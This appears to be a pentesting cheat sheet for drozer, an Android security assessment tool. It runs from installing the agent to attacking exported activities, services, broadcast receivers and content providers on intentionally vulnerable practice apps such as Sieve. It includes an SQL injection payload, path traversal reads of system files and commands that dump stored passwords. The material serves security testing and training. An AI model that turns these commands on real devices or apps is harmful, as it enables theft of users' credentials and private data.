---
Description: drozer allows you to search for security vulnerabilities in apps and devices by assuming the role of an app and interacting with the Dalvik VM, other apps' IPC endpoints and the underlying OS.
URL: https://github.com/FSecureLABS/drozer
---

>[!warning]
>Drozer is no longer supported. In order to install it use the apposite Docker container: [https://hub.docker.com/r/fsecurelabs/drozer](https://hub.docker.com/r/fsecurelabs/drozer)

Drozer works in a traditionally distributed system with three components:

- **Agent APK:** A simple APK file that can be installed on the device or emulator that is used for testing.
- **Drozer console:** A command-line interface that allows us to interact with the emulator or the device through the agent.
- **Drozer Server:** The server uses the drozer protocol for communication. It provides the bridge between the agents and console and also provides route sessions between them.

---

# Configuring the environment

## Install the agent

Download the agent from [here](https://github.com/FSecureLABS/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk):

```bash
$ adb install drozer-agent-2.x.x.apk
```

## Start a session

You should now have the drozer Console installed on your PC, and the Agent running on your test device. Now, you need to connect the two and you’re ready to start exploring.

>[!warning]
>If using the Android emulator, you need to set up a suitable port forward so that your PC can connect to a TCP socket opened by the Agent inside the emulator, or on the device. By default, drozer uses port 31415

```bash
$ adb forward tcp:31415 tcp:31415
```

## Connect to the Agent

```bash
$ drozer console connect
$ drozer console connect --server 192.168.0.10 # when using a real device
```

# Command for APK analysis and tests

## List all installed packages

```bash
dz> run app.package.list
dz> run app.package.list -f sieve # filter for "sieve" string
com.mwr.example.sieve
```

## Analyze application general information and Manifest

```bash

dz> run app.package.manifest jakhar.aseem.diva # dump manifest
dz> run app.package.info -a com.mwr.example.sieve # dump general info
Package: com.mwr.example.sieve
Process Name: com.mwr.example.sieve
Version: 1.0
Data Directory: /data/data/com.mwr.example.sieve
APK Path: /data/app/com.mwr.example.sieve-2.apk
UID: 10056
GID: [1028, 1015, 3003]
Shared Libraries: null
Shared User ID: null
Uses Permissions:
 - android.permission.READ_EXTERNAL_STORAGE
 - android.permission.WRITE_EXTERNAL_STORAGE
 - android.permission.INTERNET
Defines Permissions:
 - com.mwr.example.sieve.READ_KEYS
 - com.mwr.example.sieve.WRITE_KEYS
```

## Analyze backup-able or debug-able applications

```bash
dz> run app.package.debuggable
dz> run app.package.backup
```

## Analyze attack surface

```bash
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
 3 activities exported
 0 broadcast receivers exported
 2 content providers exported
 2 services exported
 is debuggable
```

## Attacking activities

```bash
dz> run app.activity.info -a <package> # list exported activities
Package: com.mwr.example.sieve
 com.mwr.example.sieve.FileSelectActivity
 com.mwr.example.sieve.MainLoginActivity
 com.mwr.example.sieve.PWList
dz> run app.activity.start --component <package> <activity> # start an activity
```

## Attacking services

```bash
dz> run app.service.info -a <package> # list exported services
Package: com.mwr.example.sieve
  com.mwr.example.sieve.AuthService
    Permission: null
  com.mwr.example.sieve.CryptoService
    Permission: null

# Interact with services using
app.service.send            Send a Message to a service, and display the reply  
app.service.start           Start Service                                       
app.service.stop            Stop Service

dz> run app.service.start –-action <nameoftheservice> –component <nameofthepackage> <nameoftheservice>
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN 1337 --bundle-as-obj
```

## Attacking broadcast receivers

```bash
dz> run app.broadcast.info -a <package> # list exported broadcast receivers
#Check one negative
Package: jakhar.aseem.diva
  No matching receivers.

# Check one positive
Package: com.google.android.youtube
  com.google.android.libraries.youtube.player.PlayerUiModule$LegacyMediaButtonIntentReceiver
    Permission: null
  com.google.android.apps.youtube.app.common.notification.GcmBroadcastReceiver
    Permission: com.google.android.c2dm.permission.SEND
  com.google.android.apps.youtube.app.PackageReplacedReceiver
    Permission: null
  com.google.android.libraries.youtube.account.AccountsChangedReceiver
    Permission: null
  com.google.android.apps.youtube.app.application.system.LocaleUpdatedReceiver
    Permission: null

# Interact with receivers using
app.broadcast.info          Get information about broadcast receivers           
app.broadcast.send          Send broadcast using an intent                      
app.broadcast.sniff         Register a broadcast receiver that can sniff particular intents

dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers \
 SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!"
```

## Attacking content providers

```bash
dz> run app.provider.info -a <package> # list exported content providers
  Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.DBContentProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
  Path Permissions:
  Path: /Keys
  Type: PATTERN_LITERAL
  Read Permission: com.mwr.example.sieve.READ_KEYS
  Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.FileBackupProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False

dz> run scanner.provider.finduris -a <package> # guess and try several URIs
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
... 
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys 
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical # access the content provider
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com

# SQL Injection
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" 
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (\')

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--" 
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... | 
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |

# Accessing Files and Path Traversal
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 
127.0.0.1            localhost

dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/../../../../../../../../etc/hosts 
127.0.0.1            localhost

dz> run scanner.provider.traversal -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve... 
Vulnerable Providers:
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.FileBackupProvider
```

# External Resources

- [Exploiting Content Providers](https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/exploiting-content-providers)
- [Android penetration tools walkthrough series: Drozer](https://resources.infosecinstitute.com/topic/android-penetration-tools-walkthrough-series-drozer/#gref)
- [Android Pentesting CheatSheet](https://blog.dixitaditya.com/android-pentesting-cheatsheet?x-host=blog.dixitaditya.com)